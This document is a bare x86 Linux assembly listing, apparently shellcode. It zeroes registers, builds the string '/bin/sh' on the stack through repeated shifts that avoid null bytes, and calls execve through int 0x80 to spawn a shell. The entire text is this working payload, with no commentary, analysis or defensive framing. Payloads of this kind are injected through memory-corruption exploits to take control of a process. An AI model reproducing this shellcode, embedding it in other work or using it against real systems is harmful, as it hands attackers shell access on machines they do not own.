
xor eax,eax
mov al,0xb
xor ecx,ecx
xor edx,edx


xor ebx, ebx
mov bh, 0x68
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
mov bh, 0x73
mov bl, 0x2f
push ebx
nop

xor ebx, ebx
mov bh, 0x6e
mov bl, 0x69
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx

shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
mov bh, 0x62
mov bl, 0x2f
push ebx
nop

mov ebx, esp
int 0x80

